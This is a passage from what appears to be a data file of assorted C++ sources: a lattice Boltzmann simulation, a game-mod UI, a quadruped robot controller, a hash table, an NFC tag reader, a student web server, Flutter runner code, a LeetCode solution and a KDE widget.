//nu[1] = 1.0/30.0;\n\n    size_t nx = 100, ny = 100;\n\n    // Setting top and bottom wall as solid\n    LBM::Domain Dom(D2Q9, nu, iVec3_t(nx,ny,1), 1.0, 1.0);\n    UserData dat;\n    Dom.UserData = &dat;\n    Dom.Sc       = 0.0;\n    dat.g           = 0.0,0.0001,0.0;\n    //dat.g           = 0.0,0.0,0.0;\n    for (size_t i=0;i<nx;i++)\n    {\n        Dom.Lat[0].GetCell(iVec3_t(i,0   ,0))->IsSolid = true;\n        Dom.Lat[0].GetCell(iVec3_t(i,ny-1,0))->IsSolid = true;\n        Dom.Lat[1].GetCell(iVec3_t(i,0   ,0))->IsSolid = true;\n        Dom.Lat[1].GetCell(iVec3_t(i,ny-1,0))->IsSolid = true;\n    }\n\n    // Set inner drop\n    int obsX = nx/2, obsY = ny/2;\n    int radius =  nx/8.0;\n\n\tfor (size_t i=0; i<nx; ++i)\n\tfor (size_t j=0; j<ny; ++j)\n    {\n\t\tVec3_t V;  V = 0.0, 0.0, 0.0;\n\t\tif (pow((int)(i)-obsX,2.0) + pow((int)(j)-obsY,2.0) <= pow(radius,2.0)) // circle equation\n\t\t{\n            //Dom.Lat[0].GetCell(iVec3_t(i,j,0))->Initialize(1300.0,V);\n            //Dom.Lat[1].GetCell(iVec3_t(i,j,0))->Initialize(0.1,V);\n            Dom.Lat[0].GetCell(iVec3_t(i,j,0))->Initialize(0.1,V);\n            Dom.Lat[1].GetCell(iVec3_t(i,j,0))->Initialize(100.0,V);\n\t\t}\n\t\telse\n\t\t{\n            //Dom.Lat[0].GetCell(iVec3_t(i,j,0))->Initialize(0.1,V);\n            //Dom.Lat[1].GetCell(iVec3_t(i,j,0))->Initialize(100.0,V);\n            Dom.Lat[0].GetCell(iVec3_t(i,j,0))->Initialize(1300.0,V);\n            Dom.Lat[1].GetCell(iVec3_t(i,j,0))->Initialize(0.1,V);\n\t\t}\n\t\t//if (pow((int)(i)-obsX-nx/3,2.0) + pow((int)(j)-4*ny/5,2.0) <= pow(radius/3,2.0)) // circle equation\n        //{\n            //Dom.Lat[0].GetCell(iVec3_t(i,j,0))->IsSolid = true;\n            //Dom.Lat[1].GetCell(iVec3_t(i,j,0))->IsSolid = true;\n        //}\n    }\n\n    // Set parameters\n    Dom.Lat[0].G = -200.0;\n    Dom.Lat[0].Gs= -1000.0;\n    Dom.Lat[1].G =  0.0;\n    Dom.Lat[1].Gs=  400.0;\n    Dom.Gmix     =  0.001;\n\n    Dom.Solve(1.0e4,1.0e2,Setup,NULL,\"multicomp\",true,Nproc);\n\n\n    return 0;\n}\nMECHSYS_CATCH\n",
    "#include \"UI/CampaignSelectionFlowCoordinator.hpp\"\n#include \"BSML/shared/BSML.hpp\"\n#include \"UI/ViewControllers/CampaignSelectionViewController.hpp\"\n\nDEFINE_TYPE(CustomCampaigns::UI, CampaignSelectionFlowCoordinator);\n\nnamespace CustomCampaigns::UI {\n    void CampaignSelectionFlowCoordinator::ctor() {\n        INVOKE_CTOR();\n        HMUI::FlowCoordinator::_ctor();\n    }\n\n    void CampaignSelectionFlowCoordinator::Inject(GlobalNamespace::MainFlowCoordinator* baseFlow, ViewControllers::CampaignSelectionViewController* campaignSelection) {\n        _baseFlow = baseFlow;\n        _campaignSelection = campaignSelection;\n    }\n\n    void CampaignSelectionFlowCoordinator::Initialize() {\n        _menuButton = BSML::Register::RegisterMenuButton(\"Custom Campaigns\", \"Now on Quest!\", std::bind(&CampaignSelectionFlowCoordinator::Present, this));\n    }\n\n    void CampaignSelectionFlowCoordinator::Dispose() {\n        BSML::Register::RegisterMenuButton(_menuButton);\n        _baseFlow->_providedMainViewController = nullptr;\n    }\n\n    void CampaignSelectionFlowCoordinator::Present() {\n        auto fc = _baseFlow->YoungestChildFlowCoordinatorOrSelf();\n        fc->PresentFlowCoordinator(this, nullptr, HMUI::ViewController::AnimationDirection::Horizontal, false, false);\n    }\n\n    void CampaignSelectionFlowCoordinator::BackButtonWasPressed(HMUI::ViewController* topViewController) {\n        _parentFlowCoordinator->DismissFlowCoordinator(this, HMUI::ViewController::AnimationDirection::Vertical, nullptr, false);\n    }\n\n    void CampaignSelectionFlowCoordinator::DidActivate(bool firstActivation, bool addedToHierarchy, bool screenSystemEnabling) {\n        if (firstActivation) {\n            SetTitle(\"Custom Campaigns\", HMUI::ViewController::AnimationType::In);\n            ProvideInitialViewControllers(_campaignSelection, nullptr, nullptr, nullptr, nullptr);\n            showBackButton = true;\n        }\n    }\n}",
    "/*****************************************************************\n Test position example, read data with ROS, setup like Gazebo\n******************************************************************/\n\n#include \"unitree_legged_sdk/unitree_legged_sdk.h\"\n#include <math.h>\n#include <iostream>\n#include <stdio.h>\n#include <stdint.h>\n\n#include \"unitree_legged_msgs/LowCmd.h\"\n#include \"unitree_legged_msgs/LowState.h\"\n#include \"unitree_legged_msgs/MotorCmd.h\"\n#include \"unitree_legged_msgs/MotorState.h\"\n#include <geometry_msgs/WrenchStamped.h>\n#include <sensor_msgs/Imu.h>\n#include <std_msgs/Bool.h>\n\n#include \"convert.h\"\n\n#include \"ros/ros.h\"\n#include <unitree_legged_msgs/LowCmd.h>\n#include <unitree_legged_msgs/LowState.h>\n#include \"body.h\" //../unitree_ros/unitree_controller/include/\n#include \"../include/CurrentState.h\"\n#include \"../../include/OrientationEstimator.h\"\n#include \"../../include/PositionVelocityEstimator.h\"\n#include \"../../include/ContactEstimator.h\"\n#include \"../../include/LegController.h\"\n#include \"../../include/ControlFSMData.h\"\n#include \"../../CPG/HopfPolar.h\"\n\nusing namespace std;\nusing namespace UNITREE_LEGGED_SDK;\nusing namespace unitree_model;\n\nclass Custom\n{\npublic:\n    Custom(uint8_t level): safe(LeggedType::Go1), udp(level), listen_publish_obj(\"go1\") {\n        udp.InitCmdData(lowCmd);\n    }\n    void init();\n    void UDPRecv();\n    void UDPSend();\n    void RobotControl();\n\n    Safety safe;\n    UDP udp;\n    LowCmd lowCmd = {0};\n    LowState lowState = {0};\n    unitree_legged_msgs::LowCmd SendLowROS;\n    unitree_legged_msgs::LowState RecvLowROS;\n\n    float qInit[3]={0};\n    float qDes[3]={0};\n    float sin_mid_q[3] = {0.0, 1.2, -2.0};\n    float Kp[3] = {0};  \n    float Kd[3] = {0};\n    double time_consume = 0;\n    int rate_count = 0;\n    int sin_count = 0;\n    int motiontime = 0;\n    float dt = 0.002;     // 0.001~0.01\n\n    HopfPolar cpg;\n\n    Quadruped quad ;\n    StateEstimate stateEstimate;\n    LegController* legController;\n    StateEstimatorContainer* stateEstimator;\n    ControlFSMData* _controlData;\n    CurrentState listen_publish_obj;\n\n    // ros\n    ros::NodeHandle n;\n    // ros::Publisher lowState_pub; //for rviz visualization\n    // ros::ServiceClient set_model_state_serv;\n    // ros::Rate loop_rate(1000);\n};\n\nvoid Custom::init()\n{  \n    string robot_name = \"go1\";\n    // the following nodes have been initialized by \"gazebo.launch\"\n    // lowState_pub = n.advertise<unitree_legged_msgs::LowState>(\"/\" + robot_name + \"_gazebo/lowState/state\", 1);\n    // servo_pub[0] = n.advertise<unitree_legged_msgs::MotorCmd>(\"/\" + robot_name + \"_gazebo/FR_hip_controller/command\", 1);\n    // servo_pub[1] = n.advertise<unitree_legged_msgs::MotorCmd>(\"/\" + robot_name + \"_gazebo/FR_thigh_controller/command\", 1);\n    // servo_pub[2] = n.advertise<unitree_legged_msgs::MotorCmd>(\"/\" + robot_name + \"_gazebo/FR_calf_controller/command\", 1);\n    // servo_pub[3] = n.advertise<unitree_legged_msgs::MotorCmd>(\"/\" + robot_name + \"_gazebo/FL_hip_controller/command\", 1);\n    // servo_pub[4] = n.advertise<unitree_legged_msgs::MotorCmd>(\"/\" + robot_name + \"_gazebo/FL_thigh_controller/command\", 1);\n    // servo_pub[5] = n.advertise<unitree_legged_msgs::MotorCmd>(\"/\" + robot_name + \"_gazebo/FL_calf_controller/command\", 1);\n    // servo_pub[6] = n.advertise<unitree_legged_msgs::MotorCmd>(\"/\" + robot_name + \"_gazebo/RR_hip_controller/command\", 1);\n    // servo_pub[7] = n.advertise<unitree_legged_msgs::MotorCmd>(\"/\" + robot_name + \"_gazebo/RR_thigh_controller/command\", 1);\n    // servo_pub[8] = n.advertise<unitree_legged_msgs::MotorCmd>(\"/\" + robot_name + \"_gazebo/RR_calf_controller/command\", 1);\n    // servo_pub[9] = n.advertise<unitree_legged_msgs::MotorCmd>(\"/\" + robot_name + \"_gazebo/RL_hip_controller/command\", 1);\n    // servo_pub[10] = n.advertise<unitree_legged_msgs::MotorCmd>(\"/\" + robot_name + \"_gazebo/RL_thigh_controller/command\", 1);\n    // servo_pub[11] = n.advertise<unitree_legged_msgs::MotorCmd>(\"/\" + robot_name + \"_gazebo/RL_calf_controller/command\", 1);\n\n    std::cout << \"set quadruped\" << std::endl;\n    quad.setQuadruped(1); // 1 for Go1, 2 for A1\n\n    // initialize new leg controller and state estimate object\n    \n    std::cout << \"start Leg Controller\" << std::endl;\n    legController = new LegController(quad);\n    legController->zeroCommand();\n    // sendServoCmd();\n\n    std::cout << \"start state estimate\" << std::endl;\n    stateEstimator = new StateEstimatorContainer(\n                       &RecvLowROS.imu, legController->data,&stateEstimate);\n    // using sensors \n    stateEstimator->addEstimator<ContactEstimator>();\n    stateEstimator->addEstimator<VectorNavOrientationEstimator>();\n    stateEstimator->addEstimator<TunedKFPositionVelocityEstimator>();\n\n    // initialize FSMData\n    std::cout << \"start controlFSMData\" << std::endl;\n    _controlData = new ControlFSMData;\n    _controlData->_quadruped = &quad;\n    _controlData->_stateEstimator = stateEstimator;\n    _controlData->_legController = legController;\n\n    \n  ",
    "#include \"hashtable.h\"\n#include \"utils.h\"\n\nstatic inline int InlineAsmStrcmp (const char str1[WORD_LEN], const char str2[WORD_LEN]);\n\nHashTable* HashTableCtor (size_t hash_t_size, uint32_t (*hash_function) (const char*, size_t))\n{\n    HashTable* hash_t = (HashTable*) calloc (1, sizeof (HashTable));\n    hash_t->content = (List*) calloc (hash_t_size, sizeof (List));\n    hash_t->hash_function = hash_function;\n    hash_t->size = hash_t_size;\n\n    for (size_t i = 0; i < hash_t_size; i++)\n        ListCtor (&hash_t->content[i], MIN_CAPACITY);\n\n    return hash_t;\n}\n\nbool SearchElemHT (HashTable* hash_t, const char* word, size_t len)\n{\n    assert (hash_t);\n    assert (word);\n\n    uint32_t hash_value = HashFunction (hash_t, word, len) % hash_t->size;\n\n    return (bool) CheckRepeat (&hash_t->content[hash_value], word);\n}\n\nint CheckRepeat (List* list, const char* word)\n{\n    assert (list);\n    assert (word);\n\n    Node* nodes_array = list->nodes;\n    int cur_node_index = list->head;\n\n    while (cur_node_index != 0)\n    {\n        Node cur_node = nodes_array[cur_node_index];\n\n        if (InlineAsmStrcmp (word, cur_node.value) == -1) return cur_node_index;\n        cur_node_index = cur_node.next;\n    }\n\n    return 0;\n}\n\nvoid HashTableDtor (HashTable* hash_t)\n{\n    assert (hash_t);\n\n    for (size_t i = 0; i < hash_t->size; i++)\n        ListDtor (&hash_t->content[i]);\n\n    FREE (hash_t->content);\n\n    hash_t->hash_function = nullptr;\n    hash_t->size = 0;\n\n    FREE (hash_t);\n}\n\nvoid FillHashTable (HashTable* hash_t, Text* text)\n{\n    assert (hash_t);\n    assert (filename);\n\n    size_t words_num = text->nlines;\n    char* buffer = text->buffer;\n\n    for (size_t i = 0; i < words_num; ++i)\n    {\n        InsertValue (hash_t, buffer, text->words_len[i]);\n        buffer += WORD_LEN;\n    }\n}\n\nvoid InsertValue (HashTable* hash_t, const char* word, size_t len)\n{\n    assert (hash_t);\n    assert (word);\n\n    uint32_t hash_value = HashFunction (hash_t, word, len) % hash_t->size;\n\n    List* cur_list = &hash_t->content[hash_value];\n    if (CheckRepeat (cur_list, word)) return;\n\n    InsertTail (cur_list, word);\n}\n\n\nvoid DeleteValue (HashTable* hash_t, const char* word, size_t len)\n{\n    assert (hash_t);\n    assert (word);\n\n    uint32_t hash_value = HashFunction (hash_t, word, len) % hash_t->size;\n    List* cur_list = &hash_t->content[hash_value];\n\n    int position = CheckRepeat (cur_list, word);\n    if (position) ListDelete (cur_list, position);\n}\n\nstatic inline int InlineAsmStrcmp (const char str1[WORD_LEN], const char str2[WORD_LEN])\n{\n    assert (str1);\n    assert (str2);\n\n    int res = 0;\n\n    asm (\".intel_syntax noprefix\\n\"\n         \"vmovdqa ymm1, YMMWORD PTR [%1]\\n\"\n         \"vpcmpeqb ymm0, ymm1, YMMWORD PTR [%2]\\n\"\n         \"vpmovmskb %0, ymm0\\n\"\n         \".att_syntax prefix\\n\"\n         : \"=r\" (res) : \"r\" (str1), \"r\" (str2) : \"ymm0\", \"ymm1\", \"cc\");\n\n    return res;\n}\n",
    "#include <MifareUltralight.h>\n\n#define ULTRALIGHT_PAGE_SIZE 4\n#define ULTRALIGHT_READ_SIZE 4 // we should be able to read 16 bytes at a time\n\n#define ULTRALIGHT_DATA_START_PAGE 4\n#define ULTRALIGHT_MESSAGE_LENGTH_INDEX 1\n#define ULTRALIGHT_DATA_START_INDEX 2\n#define ULTRALIGHT_MAX_PAGE 63\n\n#define NFC_FORUM_TAG_TYPE_2 (\"NFC Forum Type 2\")\n\nMifareUltralight::MifareUltralight(PN532& nfcShield)\n{\n    nfc = &nfcShield;\n    ndefStartIndex = 0;\n    messageLength = 0;\n}\n\nMifareUltralight::~MifareUltralight()\n{\n}\n\nNfcTag MifareUltralight::read(byte * uid, unsigned int uidLength)\n{\n    if (isUnformatted())\n    {\n        Serial.println(F(\"WARNING: Tag is not formatted.\"));\n        return NfcTag(uid, uidLength, NFC_FORUM_TAG_TYPE_2);\n    }\n\n    readCapabilityContainer(); // meta info for tag\n    findNdefMessage();\n    calculateBufferSize();\n\n    if (messageLength == 0) { // data is 0x44 0x03 0x00 0xFE\n        NdefMessage message = NdefMessage();\n        message.addEmptyRecord();\n        return NfcTag(uid, uidLength, NFC_FORUM_TAG_TYPE_2, message);\n    }\n\n    boolean success;\n    uint8_t page;\n    uint8_t index = 0;\n    byte buffer[bufferSize];\n    for (page = ULTRALIGHT_DATA_START_PAGE; page < ULTRALIGHT_MAX_PAGE; page++)\n    {\n        // read the data\n        success = nfc->mifareultralight_ReadPage(page, &buffer[index]);\n        if (success)\n        {\n            #ifdef MIFARE_ULTRALIGHT_DEBUG\n            Serial.print(F(\"Page \"));Serial.print(page);Serial.print(\" \");\n            nfc->PrintHexChar(&buffer[index], ULTRALIGHT_PAGE_SIZE);\n            #endif\n        }\n        else\n        {\n            Serial.print(F(\"Read failed \"));Serial.println(page);\n            // TODO error handling\n            messageLength = 0;\n            break;\n        }\n\n        if (index >= (messageLength + ndefStartIndex))\n        {\n            break;\n        }\n\n        index += ULTRALIGHT_PAGE_SIZE;\n    }\n\n    NdefMessage ndefMessage = NdefMessage(&buffer[ndefStartIndex], messageLength);\n    return NfcTag(uid, uidLength, NFC_FORUM_TAG_TYPE_2, ndefMessage);\n\n}\n\nboolean MifareUltralight::isUnformatted()\n{\n    uint8_t page = 4;\n    byte data[ULTRALIGHT_READ_SIZE];\n    boolean success = nfc->mifareultralight_ReadPage (page, data);\n    if (success)\n    {\n        return (data[0] == 0xFF && data[1] == 0xFF && data[2] == 0xFF && data[3] == 0xFF);\n    }\n    else\n    {\n        Serial.print(F(\"Error. Failed read page \"));Serial.println(page);\n        return false;\n    }\n}\n\n// page 3 has tag capabilities\nvoid MifareUltralight::readCapabilityContainer()\n{\n    byte data[ULTRALIGHT_PAGE_SIZE];\n    int success = nfc->mifareultralight_ReadPage (3, data);\n    if (success)\n    {\n        // See AN1303 - different rules for Mifare Family byte2 = (additional data + 48)/8\n        tagCapacity = data[2] * 8;\n        #ifdef MIFARE_ULTRALIGHT_DEBUG\n        Serial.print(F(\"Tag capacity \"));Serial.print(tagCapacity);Serial.println(F(\" bytes\"));\n        #endif\n\n        // TODO future versions should get lock information\n    }\n}\n\n// read enough of the message to find the ndef message length\nvoid MifareUltralight::findNdefMessage()\n{\n    int page;\n    byte data[12]; // 3 pages\n    byte* data_ptr = &data[0];\n\n    // the nxp read command reads 4 pages, unfortunately adafruit give me one page at a time\n    boolean success = true;\n    for (page = 4; page < 6; page++)\n    {\n        success = success && nfc->mifareultralight_ReadPage(page, data_ptr);\n        #ifdef MIFARE_ULTRALIGHT_DEBUG\n        Serial.print(F(\"Page \"));Serial.print(page);Serial.print(F(\" - \"));\n        nfc->PrintHexChar(data_ptr, 4);\n        #endif\n        data_ptr += ULTRALIGHT_PAGE_SIZE;\n    }\n\n    if (success)\n    {\n        if (data[0] == 0x03)\n        {\n            messageLength = data[1];\n            ndefStartIndex = 2;\n        }\n        else if (data[5] == 0x3) // page 5 byte 1\n        {\n            // TODO should really read the lock control TLV to ensure byte[5] is correct\n            messageLength = data[6];\n            ndefStartIndex = 7;\n        }\n    }\n\n    #ifdef MIFARE_ULTRALIGHT_DEBUG\n    Serial.print(F(\"messageLength \"));Serial.println(messageLength);\n    Serial.print(F(\"ndefStartIndex \"));Serial.println(ndefStartIndex);\n    #endif\n}\n\n// buffer is larger than the message, need to handle some data before and after\n// message and need to ensure we read full pages\nvoid MifareUltralight::calculateBufferSize()\n{\n    // TLV terminator 0xFE is 1 byte\n    bufferSize = messageLength + ndefStartIndex + 1;\n\n    if (bufferSize % ULTRALIGHT_READ_SIZE != 0)\n    {\n        // buffer must be an increment of page size\n        bufferSize = ((bufferSize / ULTRALIGHT_READ_SIZE) + 1) * ULTRALIGHT_READ_SIZE;\n    }\n}\n\nboolean MifareUltralight::write(NdefMessage& m, byte * uid, unsigned int uidLength)\n{\n    if (isUnformatted())\n    {\n        Serial.println(F(\"WARNING: Tag is not formatted.\"));\n        return false;\n    }\n    readCapabilityContainer(); // meta info for tag\n\n    messageLength  = m.getEncodedSize();\n   ",
    "/* ************************************************************************* */\n/*      ##       ##      ## ##       ##      ## ##       ##      ##          */\n/*       ##     ####    ##   ##     ####    ##   ##     ####    ##           */\n/*        ##  ##   ##  ##     ##  ##   ##  ##     ##  ##   ##  ##            */\n/*         ####     ####       ####     ####       ####     ####             */\n/*          ##       ##         ##       ##         ##       ##              */\n/*                                                                           */\n/*           WONDERFUL            WEBSERV           WONDERTEAM               */\n/*                                                                           */\n/*      FELICIA KOOLHOVEN      FLEN HUISMAN       MARES VERBRUGGE            */\n/*          fkoolhov             fhuisman             mverbrug               */\n/*                                                                           */\n/*          Codam Coding College        part of 42 network                   */\n/*                            April - May 2024                               */\n/* ************************************************************************* */\n\n# include \"Epoll.hpp\"\n# include \"Client.hpp\"\n# include \"ServerPool.hpp\"\n\nClient::Client(const Server& server) : _server(server), _readyFor(READ), _response(nullptr)\n{\n\tstd::cout << \"Client constructor called\" << std::endl;\n\tif ((_socketFD = accept(server.getSocketFD(), server.getServerInfo()->ai_addr, &server.getServerInfo()->ai_addrlen)) < 0)\n\t\tstd::cout << \"Error: failed to accept new connection (Client class constructor) with accept()\" << std::endl;\n\tstd::cout << \"_readyFor flag in constructor = \" << _readyFor << std::endl; //! for testing\n\t// give reference of Server to constructor of Client so we access Epoll instance through reference\n\tif (server.getEpollReference().addFDToEpoll(this, EPOLLIN | EPOLLOUT, _socketFD) < 0)\n\t{\n\t\tclose(_socketFD); // close server socket\n\t\tthrow std::runtime_error(\"Error adding fd to epoll\");\n\t}\n}\n\nClient::~Client()\n{\n\tclose(_socketFD); // close client socket\n\tstd::cout << \"Client destructor called\" << std::endl;\n}\n\nvoid Client::setReadyForFlag(int readyFor)\n{\n\t_readyFor = readyFor;\n}\n\nint Client::getReadyForFlag() const\n{\n\treturn _readyFor;\n}\n\n/*\nRecv() is use to receive data from a socket\n*/\nvoid Client::clientReceives()\n{\n\tchar buffer[BUFSIZ]{}; // buffer to hold client data, BUFSIZ = 8192?\n\tssize_t recv_return{};\n\n\trecv_return = recv(_socketFD, buffer, BUFSIZ - 1, 0);\n\n\t// TO TEST:\n\t// std::cout << \"Receiving data from client socket. Bytes received: \" << recv_return << std::endl;\n    buffer[recv_return] = '\\0'; // it this necessary to do ourselves?\n\t// std::cout << \"recv_return = \" << recv_return << std::endl;\n\t// END OF TEST\n\n\ttry \n\t{\n\t\tstd::unique_ptr<Request> request = std::make_unique<Request>(buffer, recv_return);\n\t\tstd::cout << *request << std::endl; // for for debugging purposes\n\t\tstd::unique_ptr<RequestHandler> requestHandler = std::make_unique<RequestHandler>(*request, _server);\n\t\tif (!requestHandler->isCGI())\n\t\t{\n\t\t\t_response = std::make_unique<Response>(*requestHandler);\n\t\t\t// std::cout << *_response << std::endl; // for for debugging purposes\n\t\t}\n\t}\n\tcatch (const e_status& statusCode)\n\t{\n\t\tstd::unique_ptr<ErrorHandler> errorHandler = std::make_unique<ErrorHandler>(statusCode, _server);\n\t\t_response = std::make_unique<Response>(*errorHandler);\n\t\t// std::cout << \"statusCode: \" << statusCode << std::endl; //for debugging purposes\n\t\t// std::cout << *_response << std::endl; // for for debugging purposes\n\t}\n\t// TODO:\n\t// clear buffer before recv?\n\n\t// TODO:\n\t// add check for:\n\t// if (recv_return <= 0)\n\t// remove client from epoll!\n\n\t// TODO:\n\t// call parse request\n\t// call process request\n\t// if no errors: change flag to WRITE\n\t_readyFor = WRITE;\n}\n\n\nvoid Client::clientWrites()\n{\n\t// TO TEST:\n\t// std::string message = \"HTTP/1.1 200 OK\\nContent-Type: text/html\\nContent-Length: 124\\n\\n<html>\\n <head>\\n </head>\\n <body>\\nHey Wonderfull webserv wonderteam <3 \\n _socketFD van deze client = \" + std::to_string(_socketFD) + \" \\n </body>\\n</html>\\n\";\n\t// const char* message_ready = message.c_str();\n\t// std::cout << \"Message_ready in clientWrites = \" << message_ready << std::endl;\n\t//  \"HTTP/1.1 200 OK\\nContent-Type: text/html\\nContent-Length: 124\\n\\n<html>\\n <head>\\n </head>\\n <body>\\nHey Wonderfull webserv wonderteam <3\\n </body>\\n</html>\\n\";\n\n\t// write(_socketFD, message_ready, strlen(message_ready));\n\tssize_t send_return{};\n\tsend_return = send(_socketFD, _response->getResponseMessage().c_str(), _response->getResponseMessage().length(), 0);\n    // std::cout << \"WROTE TO CONNECTION!\" << std::endl;\n\t// TO TEST:\n\t// std::cout << \"Send data to client socket. Bytes sent: \" << send_return << std::endl;\n\n\t// TODO: add check for:\n\t// if (send_return < 0)\n\t// remove client from epoll!\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "//\n// Created by CZQ on 2024/5/7.\n//\n\n\n/**\n * Definition for a binary tree node.\n * struct TreeNode {\n *     int val;\n *     TreeNode *left;\n *     TreeNode *right;\n *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}\n * };\n */\n#include \"bits/stdc++.h\"\nusing namespace std;\nstruct TreeNode {\n    int val;\n    TreeNode *left;\n    TreeNode *right;\n    TreeNode() : val(0), left(nullptr), right(nullptr) {}\n    TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}\n    TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}\n};\nclass Solution {\npublic:\n    TreeNode *ans;\n    bool dfs(TreeNode* root, TreeNode* p, TreeNode* q){\n        if(!root)\n            return false;\n        bool l = dfs(root->left,p,q);\n        bool r = dfs(root->right,p,q);\n        if((l&&r) || ((root->val==p->val) || (root->val==q->val))&&(l||r) )\n            ans = root;\n        return l ||r || (root->val==p->val) || (root->val==q->val);\n    }\n    TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) {\n        dfs(root,p,q);\n        return ans;\n    }\n};",
    "/****************************************************************************\n *                                                                          *\n *   This file is part of KDE CDEmu Manager.                                *\n *                                                                          *\n *   Copyright (C) 2009-2024 by Marcel Hasler <mahasler@gmail.com>          *\n *                                                                          *\n *   This program is free software; you can redistribute it and/or modify   *\n *   it under the terms of the GNU General Public License as published by   *\n *   the Free Software Foundation, either version 3 of the License, or      *\n *   (at your option) any later version.                                    *\n *                                                                          *\n *   This program is distributed in the hope that it will be useful,        *\n *   but WITHOUT ANY WARRANTY; without even the implied warranty of         *\n *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the           *\n *   GNU General Public License for more details.                           *\n *                                                                          *\n *   You should have received a copy of the GNU General Public License      *\n *   along with this program. If not, see <http://www.gnu.org/licenses/>.   *\n *                                                                          *\n ****************************************************************************/\n\n#include \"devicelistitem.h\"\n\n#include <KLocalizedString>\n\n#include <QHBoxLayout>\n\nDeviceListItem::DeviceListItem(int index)\n    : m_index(index),\n      m_widget(new QWidget),\n      m_label(new QLabel),\n      m_button(new QPushButton)\n{\n    setFlags(Qt::NoItemFlags);\n\n    m_button->setFixedWidth(30);\n    m_button->setFlat(true);\n\n    connect(m_button, SIGNAL(clicked()), this, SLOT(onButtonClicked()));\n\n    auto layout = new QHBoxLayout(m_widget);\n    layout->addWidget(m_label);\n    layout->addWidget(m_button);\n    layout->setContentsMargins(0, 0, 0, 0);\n    m_widget->setLayout(layout);\n}\n\n// ---------------------------------------------------------------------------------------------- //\n\nvoid DeviceListItem::setFileName(const QString& name)\n{\n    m_label->setText(name);\n\n    if (name.isEmpty())\n    {\n        m_button->setIcon(QIcon::fromTheme(\"document-open\"));\n        m_button->setToolTip(i18n(\"Select image file\"));\n    }\n    else\n    {\n        m_button->setIcon(QIcon::fromTheme(\"media-eject\"));\n        m_button->setToolTip(i18n(\"Unmount current image\"));\n\n    }\n}\n\n// ---------------------------------------------------------------------------------------------- //\n\nauto DeviceListItem::fileName() const -> QString\n{\n    return m_label->text();\n}\n\n// ---------------------------------------------------------------------------------------------- //\n\nauto DeviceListItem::widget() const -> QWidget*\n{\n    return m_widget;\n}\n\n// ---------------------------------------------------------------------------------------------- //\n\nvoid DeviceListItem::onButtonClicked()\n{\n    if (m_label->text().isEmpty())\n        emit mountClicked(m_index);\n    else\n        emit unmountClicked(m_index);\n}\n\n// ---------------------------------------------------------------------------------------------- //\n",
